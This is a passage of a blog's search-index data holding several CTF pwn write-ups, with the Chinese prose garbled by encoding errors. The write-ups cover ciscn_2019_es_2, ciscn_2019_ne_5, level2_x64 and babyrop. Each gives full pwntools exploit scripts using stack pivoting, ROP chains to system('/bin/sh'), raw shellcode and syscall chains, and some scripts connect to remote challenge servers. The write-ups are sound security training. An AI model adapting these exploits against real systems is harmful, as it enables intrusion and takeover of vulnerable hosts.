ˆé¡¶æŒ‡é’ˆæŒ‡å‘äº†æˆ‘ä»¬å¸Œæœ›çš„ä½ç½®ï¼Œè¿™æ—¶ç”±äºleaveæŒ‡ä»¤ï¼Œç¨‹åºä¼šå°†æˆ‘ä»¬ä¼ªé€ çš„æ ˆé¡¶çš„ç¬¬ä¸€ä¸ªæ•°æ®popè¿›ebpï¼Œç„¶åç”±äºretæŒ‡ä»¤å†å°†ç¬¬äºŒä¸ªæ•°æ®å¼¹è¿›eipä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥åœ¨ä¼ªé€ çš„æ ˆçš„ç¬¬äºŒä¸ªæ•°æ®æ”¾å…¥systemå‡½æ•°çš„åœ°å€\nç„¶åæˆ‘ä»¬å°±å¯ä»¥å½“æ™®é€šçš„æ ˆæº¢å‡ºæ„é€ æ ˆäº†ã€‚\nsystemåé¢è·Ÿä¸ª0ï¼Œå†è·Ÿ/bin/shçš„åœ°å€å°±ğŸ†—äº†\næ³„éœ²ebp æˆ‘ä»¬çœ‹åˆ°æºç¨‹åºä¸­ï¼š\nmemset(s, 0, 0x20u); read(0, s, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, s); è¿™ä¸ªså­—ç¬¦æ•°ç»„è¢«åˆå§‹åŒ–ä¸ºå…¨\\0ï¼Œæ­¤æ—¶å¦‚æœæˆ‘ä»¬å°†è¯¥æ•°ç»„æ‰€æœ‰çš„ä½éƒ½è¦†ç›–ä¸ºåƒåœ¾æ•°æ®ï¼Œé‚£ä¹ˆç”±äºæ•°ç»„ä¸­æ²¡æœ‰\\0äº†ï¼Œå®ƒå°±ä¼šæŠŠç´§è·Ÿåœ¨såé¢çš„æ•°æ®ä¸€é½æ‰“å°å‡ºæ¥ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ª\\0ä¸ºæ­¢ã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœæˆ‘ä»¬ä½¿ç”¨sendlineå‡½æ•°ï¼Œç¨‹åºè¯»å…¥çš„å­—ç¬¦æœ€åä¼šå¤šä¸€ä¸ª\\nï¼Œæ‰€ä»¥è¿™é‡Œå‘é€payloadåº”è¯¥ç”¨sendã€‚åŒæ—¶åœ¨payloadä¸­ä½¿ç”¨ä¸€ä¸ªä¸å‰é¢ä¸åŒçš„å­—ç¬¦åšå“¨å…µï¼š\npayload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; p.clean() p.send(payload) ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦æ»¡è¶³ï¼š\nåˆšå¥½è¾“å…¥0x28ä¸ªæ•°æ® è¾“å…¥çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸å‰é¢è¾“å…¥çš„ä¸åŒ å°±å¯ä»¥äº†\né‚£ä¹ˆsendlineå‡½æ•°ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ç”¨ï¼š\npayload = b\u0026#34;a\u0026#34;*0x27 p.clean() p.sendline(payload) ç”¨\\nå­—ç¬¦åšå“¨å…µå°±å¯ä»¥äº†ã€‚\nç„¶åæˆ‘ä»¬å°±å¯ä»¥recvebpåœ°å€äº†ï¼š\np.recvuntil(b\u0026#34;b\u0026#34;) ebp_addr = u32(p.recv(4)) # æˆ‘ä»¬å¯ä»¥è®²ç¤¼è²Œä¸€ç‚¹ï¼Œæ ˆè¿ç§»å®Œåè¿”å›åœ°å€å’ŒåŸæ¥ä¸€æ · eip_addr = u32(p.recv(4)) å¼€å§‹æ ˆè¿ç§» æˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°å½“æ¢å¤ebpå¤‡ä»½å€¼çš„æ—¶å€™ï¼Œè¿™ä¸ªå¤‡ä»½å€¼æ¯”å½“æ—¶ebpçš„å€¼åˆšå¥½å¤š0x10ï¼š\né‚£ä¹ˆæˆ‘ä»¬çš„payloadå°±å‡ºæ¥äº†ï¼š\nleave_ret = 0x080484b8 # commandä¹Ÿå¯ä»¥æ˜¯cat flag command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) å®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./ciscn_2019_es_2\u0026#34; # libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485FD\u0026#34;) else: p = process(fn) m_elf = ELF(fn) p.clean() payload1 = b\u0026#34;a\u0026#34;*0x27 p.sendline(payload1) p.recvuntil(b\u0026#34;\\n\u0026#34;) ebp_addr = u32(p.recv(4)) eip_addr = u32(p.recv(4)) success(hex(ebp_addr)) p.clean() leave_ret = 0x080484b8 command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/","section":"writeup","summary":"Self-trust is the first secret of success. â€” Ralph Waldo Emerson åŸé¢˜é“¾æ¥ ã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ã€Write-upã€‘BUUCTF ciscn_2019_es_2 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ˆè¿ç§»çš„åŸº","tags":["pwn","æ ˆè¿ç§»"],"title":"ã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ciscn_2019_es_2"},{"categories":["writeup"],"contents":" You may say I\u0026rsquo;m a dreamer, but I\u0026rsquo;m not the only one, I hope someday you will join us, and the world will live as one. â€” John Lennon\nåŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF ciscn_2019_ne_5 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_2019_ne_5 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_ne_5/ciscn_2019_ne_5\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax int v4; // [esp+0h] [ebp-100h] BYREF char src[4]; // [esp+4h] [ebp-FCh] BYREF char v6[124]; // [esp+8h] [ebp-F8h] BYREF char s1[4]; // [esp+84h] [ebp-7Ch] BYREF char v8[96]; // [esp+88h] [ebp-78h] BYREF int *v9; // [esp+F4h] [ebp-Ch] v9 = \u0026amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(v8, 0, sizeof(v8)); *(_DWORD *)src = 48; memset(v6, 0, sizeof(v6)); puts(\u0026#34;Welcome to use LFS.\u0026#34;); printf(\u0026#34;Please input admin password:\u0026#34;); __isoc99_scanf(\u0026#34;%100s\u0026#34;, s1); if ( strcmp(s1, \u0026#34;administrator\u0026#34;) ) { puts(\u0026#34;Password Error!\u0026#34;); exit(0); } puts(\u0026#34;Welcome!\u0026#34;); puts(\u0026#34;Input your operation:\u0026#34;); puts(\u0026#34;1.Add a log.\u0026#34;); puts(\u0026#34;2.Display all logs.\u0026#34;); puts(\u0026#34;3.Print all logs.\u0026#34;); printf(\u0026#34;0.Exit\\n:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); switch ( v4 ) { case 0: exit(0); return result; case 1: AddLog(src); result = sub_804892B(argc, argv, envp); break; case 2: Display(src); result = sub_804892B(argc, argv, envp); break; case 3: Print(); result = sub_804892B(argc, argv, envp); break; case 4: GetFlag(src); result = sub_804892B(argc, argv, envp); break; default: result = sub_804892B(argc, argv, envp); break; } return result; } é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°äº†å¯†ç ä¸ºadministratorï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°ä¸‹é¢çš„switch-caseè¯­å¥\nç»è¿‡åˆ†ææˆ‘ä»¬å‘ç°åªæœ‰å½“caseä¸º1æ—¶èƒ½å¤Ÿè¾“å…¥128ä¸ªå­—ç¬¦ï¼š\nä½†æ˜¯ä¿å­˜è¾“å…¥çš„å˜é‡ä¸åœ¨å½“å‰æ ˆä¸­ï¼Œè€Œä¸”åœ¨åŸæœ¬çš„mainå‡½æ•°ä¸­ä¼ å…¥çš„å‚æ•°ä¹Ÿåªæ˜¯ä¸€ä¸ªä¿å­˜åœ°å€çš„4å­—èŠ‚å˜é‡ï¼Œå› æ­¤å¯¹åŸæœ¬çš„mainå‡½æ•°ä¹Ÿæ„æˆä¸äº†æº¢å‡ºã€‚\nä½†æ˜¯æˆ‘ä»¬åˆå‘ç°ï¼Œæˆ‘ä»¬åœ¨srcå˜é‡æ‰€æŒ‡çš„å†…å­˜ä¸­ä¿å­˜çš„æ•°æ®ä¼šè¢«åˆ«çš„å‡½æ•°åˆ©ç”¨ï¼š\nåŒæ—¶æˆ‘ä»¬å‘ç°pltè¡¨ä¸­æœ‰systemï¼š\n$ readelf -r ciscn_2019_ne_5 é‡å®šä½èŠ‚ \u0026#39;.rel.dyn\u0026#39; at offset 0x3c4 contains 4 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° 08049ff0 00000506 R_386_GLOB_DAT 00000000 stderr@GLIBC_2.0 08049ff4 00000906 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ff8 00000c06 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08049ffc 00000d06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 é‡å®šä½èŠ‚ \u0026#39;.rel.plt\u0026#39; at offset 0x3e4 contains 10 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 strcmp@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a018 00000407 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 strcpy@GLIBC_2.0 0804a020 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a024 00000807 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a028 00000a07 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a02c 00000b07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a030 00000e07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 åœ¨è¿™é¢˜ä¸­Displayå‡½æ•°æ²¡æœ‰ç”¨ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®çš„pltè¡¨ä¸­systemå‡½æ•°å°±å¯ä»¥é€šè¿‡Displayå‡½æ•°æ³„éœ²åŸºå€æ¥ret2libcã€‚\nè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„æ•°æ®åœ¨GetFlagå‡½æ•°ä¸­ä¼šè¢«strcpyä¿å­˜åœ¨å®ƒæ ˆä¸­çš„ä¸€ä¸ªå˜é‡ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é—´æ¥åœ°æ ˆæº¢å‡ºäº†\næ„å»ºexp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_ne_5\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25151\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) m_elf = ELF(fn) bin_sh = 0x80482EA p.clean() p.sendline(b\u0026#34;administrator\u0026#34;) p.clean() p.sendline(b\u0026#34;1\u0026#34;) payload = b\u0026#34;a\u0026#34;*(0x48 + 0x4) + \\ pg(m_elf.plt[\u0026#39;system\u0026#39;]) \\ + pg(m_elf.plt[\u0026#39;exit\u0026#39;]) + pg(bin_sh) p.sendline(payload) p.clean() p.sendline(b\u0026#39;4\u0026#39;) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_ne_5/","section":"writeup","summary":"You may say I\u0026rsquo;m a dreamer, but I\u0026rsquo;m not the only one, I hope someday you will join us, and the world will live as one. â€” John Lennon åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF ciscn_2019_ne_5 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„","tags":["pwn"],"title":"BUUCTF ciscn_2019_ne_5"},{"categories":["writeup"],"contents":" I believe that we are fundamentally the same and have the same basic potential. â€” Dalai Lama\nåŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF Jarvisoj_level2_x64 checksec æŸ¥çœ‹æ¶æ„ ida æŸ¥çœ‹ä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹æ¶æ„ $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) çœ‹æ¥è¯¥ç¨‹åºæ˜¯ 64 ä½çš„ï¼Œè€Œä¸”å› ä¸º NX ä¸èƒ½ä½¿ç”¨ shellcode\nåŒæ—¶ï¼Œ64 ä½ç³»ç»Ÿè°ƒç”¨ system è¿˜è¦æ³¨æ„æ ˆå¯¹é½çš„æƒ…å†µï¼Œè¦å‡†å¤‡ä¸€ä¸ªretçš„ gadget\nida æŸ¥çœ‹ä¼ªä»£ç  æˆ‘ä»¬å…ˆè¿è¡Œä¸€ä¸‹åº·åº·ï¼š\n$ ./level2_x64 Input: Hello World! çœ‹æ¥æœ‰ä¸€ä¸ªè¾“å…¥å£ï¼Œæœ‰æœºä¼šæ ˆæº¢å‡ºï¼Œæˆ‘ä»¬ç”¨ ida çœ‹çœ‹\nè¿™ä¸ªvulnerable_functionå±å®æ˜¯æœ‰ç‚¹å¤§æ‘‡å¤§æ‘†äº†\nç‚¹è¿›å»åº·åº·ï¼š\nè¿™æ˜æ‘†ç€æ˜¯è¦æ ˆæº¢å‡ºç„¶åè°ƒç”¨ plt è¡¨ä¸­çš„ system å‡½æ•°\næ„å»º exp å¯»æ‰¾ system å‡½æ•°åœ°å€ï¼š\nè¦æ³¨æ„çš„æ˜¯ï¼Œç›´æ¥ç”¨readelf -r level2_x64å‘½ä»¤è¯»åˆ°çš„æ˜¯.rela.plt çš„ç¬¦å·è¡¨ï¼ˆæ¶‰åŠåˆ°å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡åšæ–‡ï¼‰\nå¯»æ‰¾\u0026quot;\\bin\\sh\u0026quot;ï¼š\n$ ROPgadget --binary level2_x64 --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000600a90 : /bin/sh è¿˜å¥½æœ‰ç°æˆçš„ï¼Œä¸ç”¨è‡ªå·±å»æ„å»ºäº†\nå¯»æ‰¾ä¸¤ä¸ª gadgetï¼š\n$ ROPgadget --binary level2_x64 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ 0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop r14 ; pop r15 ; ret 0x00000000004006b2 : pop r15 ; ret 0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400560 : pop rbp ; ret 0x00000000004006b3 : pop rdi ; ret 0x00000000004006b1 : pop rsi ; pop r15 ; ret 0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004a1 : ret Unique gadgets found: 11 å¯ä»¥æ‰¾åˆ°pop rdi;retå’Œretï¼š\n0x00000000004006b3 : pop rdi ; ret 0x00000000004004a1 : ret ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ„å»º exp äº†\næ³¨æ„ï¼Œæˆ‘ä»¬åœ¨ä¸€å¼€å§‹å¯ä»¥ä¸åŠ retï¼Œè¯•è¿‡ä¸€æ¬¡å¦‚æœå‡ºç° EOF å†åŠ ï¼Œå¦‚æœåŠ äº†è¿˜æ˜¯æŠ¥é”™å°±è¯´æ˜ä¸æ˜¯æ ˆå¯¹é½çš„é—®é¢˜\nå®Œæ•´ exp from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./level2_x64\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;}) ret = 0x4004a1 pop_rdi_ret = 0x4006b3 bin_sh = 0x600a90 system_addr = 0x4004c0 p.recvuntil(b\u0026#34;Input:\\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(ret) + pg(pop_rdi_ret) + pg(bin_sh) + pg(system_addr) p.sendline(payload) p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/jarvisoj_level2_x64/","section":"writeup","summary":"I believe that we are fundamentally the same and have the same basic potential. â€” Dalai Lama åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF Jarvisoj_level2_x64 checksec æŸ¥çœ‹æ¶æ„ ida æŸ¥çœ‹ä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹æ¶æ„ $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found","tags":["pwn"],"title":"BUUCTF Jarvisoj_level2_x64"},{"categories":null,"contents":"","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/archive/archive/","section":"archive","summary":"","tags":null,"title":"å½’æ¡£"},{"categories":["writeup"],"contents":" It is not so much our friends\u0026rsquo; help that helps us, as the confidence of their help. â€” Epicurus\nåŸé¢˜é“¾æ¥\nEasyEasyEasy å› ä¸ºè¯»å…¥çš„æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•°ï¼Œæ‰€ä»¥å½“è¾“å…¥-1 çš„æ—¶å€™ä¹Ÿæ˜¯åˆæ³•çš„\nè€Œæˆ‘ä»¬çŸ¥é“ï¼Œ-1%256 ä¹Ÿæ˜¯-1ï¼Œè€Œv5[-1]æ„ä¸º*(v5-1)ï¼ŒæŒ‡å‘ v5 å‰é¢ä¸€ä¸ªæ•°ï¼Œè€Œè¯¥ç¨‹åºåªå°† v5 åé¢çš„ 0x100 ä¸ªæ•°ç½®é›¶ï¼Œæ‰€ä»¥å‰ä¸€ä¸ªæ•°ä»å¯èƒ½ä¸ºéé›¶ã€‚\näº‹å®è¯æ˜ç¡®å®å¦‚æ­¤ï¼Œç›´æ¥ nc è¿›å»è¾“å…¥-1 å³å¯\nç®€å•çš„æ ˆæº¢å‡º æ£€æŸ¥ç¨‹åºæ¶æ„ æŸ¥çœ‹ ida åç¼–è¯‘ä»£ç  é™åˆ¶ä¸€æ¬¡è¾“å…¥å¾—åˆ° shell æƒé™\næ€è·¯ä¸€ï¼šçˆ†ç ´æ ˆåœ°å€åå››ä½ å…ˆå†™å…¥ shellcodeï¼Œç„¶åè¦æŠŠ ret å€¼è¦†ç›–ä¸º shellcode åœ°å€å³æ ˆåœ°å€ï¼Œä½†æ˜¯é™åˆ¶ä¸€æ¬¡è¾“å…¥ï¼Œè€Œä¸”æ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œæ— æ³•æ³„éœ²æ ˆåœ°å€ã€‚ è¿™æ—¶å€™åœ¨ ret å€¼çš„ä¸‹é¢å››é¡¹çš„ä½ç½®ä¿å­˜äº†ä¸€ä¸ªæ ˆåœ°å€ï¼š\nä½†æ˜¯è¿™ä¸ªå€¼çš„å€’æ•°ç¬¬ä¸‰ä½å’Œ shellocde åœ°å€ä¸€å®šæ˜¯ä¸åŒçš„ æ‰€ä»¥æˆ‘ä»¬å°è¯•çˆ†ç ´æ ˆåœ°å€æœ«å››ä½\nå› ä¸ºæ ˆåœ°å€çš„æœ€åä¸€ä½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å‡†ç¡®æ¥è¯´åªç”¨çˆ†ç ´ä¸‰ä½ gets ä¼šå°†è¾“å…¥çš„\\n æ”¹ä¸º\\x00ï¼Œæ‰€ä»¥ payload åªèƒ½è¦†ç›–åˆ°æœ«äºŒä½ï¼Œå€’æ•°ä¸‰å››ä½åªèƒ½è¦†ç›–ä¸º\\x00\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) pop_rdi_ret = 0x00000000004005e3 ret = 0x000000000040028d shellcode = asm(shellcraft.sh()) print(hex(len(shellcode))) payload = shellcode + b\u0026#34;\\x00\u0026#34;*(0x8) + pg(ret)*4 + p8(0x00) p.clean() p.sendline(payload) p.clean() p.sendline() try: p.recv(timeout=0.25) p.interactive() except: p.close() æ€è·¯äºŒï¼šåˆ©ç”¨jmp raxæˆ–call rax æˆ‘ä»¬æŠŠæ–­ç‚¹è®¾åœ¨leave;retä¸Šï¼Œgdb è¿‡å»ä¼šå‘ç° rax çš„å€¼åˆšå¥½æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨jmp raxæˆ–call raxè·³è½¬åˆ° shellcode\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå¦‚æœä½¿ç”¨ pwntools ç”Ÿæˆçš„ shellcodeï¼Œå› ä¸ºæœ‰ä¸ƒä¸ª pushï¼Œæ‰€ä»¥ rsp ä¼šä¸Šç§»ï¼Œè€Œ shellcode ä¹Ÿæ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œè¿™æ—¶å°±ä¼šè¦†ç›–ä¸€éƒ¨åˆ† shellcode\nè§£å†³åŠæ³•æœ‰ä¸¤ä¸ªï¼š\nä½¿ç”¨æ›´çŸ­çš„ shellcode shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; åœ¨è·³è½¬åˆ° shellcode å‰ä½¿ rsp ä¸‹ç§» payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) å®Œæ•´ expï¼š\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) ret = 0x000000000040028d jmp_rax = 0x0000000000400485 call_rax = 0x000000000040051e shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; shellcode = asm(shellcraft.amd64.linux.sh()) print(disasm(shellcode)) print(hex(len(shellcode))) payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) p.clean() p.sendline(payload) p.clean() p.interactive() babyrop æ­¤é¢˜éœ€è¦çš„ libc ç‰ˆæœ¬åªèƒ½ç”¨ ubuntu22 æŸ¥çœ‹ç¨‹åºæ¶æ„ï¼š\næŸ¥çœ‹ ida åç¼–è¯‘ä»£ç ï¼š\næœ‰æ²™ç®±æŠŠ execve çš„ç³»ç»Ÿè°ƒç”¨ç»™ç¦äº†ï¼ˆï¼šè°¢è°¢ä½ \nåŸºæœ¬æ€è·¯å°±æ˜¯åœ¨æ ˆä¸Šä¿å­˜\u0026quot;./flag\\x00\\x00\u0026quot;å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡ openã€readã€write çš„ç³»ç»Ÿè°ƒç”¨è¯»åˆ° flag\nä¸»è¦éš¾ç‚¹æ˜¯è·å¾—./flag å­—ç¬¦ä¸²çš„æ ˆåœ°å€ï¼ˆæœ¬é¢˜ bss æ®µé•¿åº¦ä¸å¤Ÿï¼Œå­˜ä¸äº† flag å­—ç¬¦ä¸²ï¼‰\nè¦ç‚¹æ˜¯ç”¨mov rdi, rsp; add rdi, 0x40æŒ‡å‘ payload æœ«å°¾ï¼Œåœ¨æœ«å°¾ä¿å­˜ flag å­—ç¬¦ä¸²\nç„¶åè°ƒç”¨ä¾æ¬¡è°ƒç”¨ 0x2ã€0x0ã€0x1 å·ç³»ç»Ÿè°ƒç”¨ï¼ˆopenã€readã€writeï¼‰\næ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨ç¼–å·åœ¨æ­¤\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./baby_rop\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libseccomp.so.2\u0026#34; port: str = \u0026#34;10076\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40131C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) pop_rdi_ret = 0x0000000000401207 pop_rdx_ret = 0x000000000040120d mov_rsi_rdi_ret = 0x000000000040120f pop_rax_syscall_ret = 0x0000000000401213 ret = 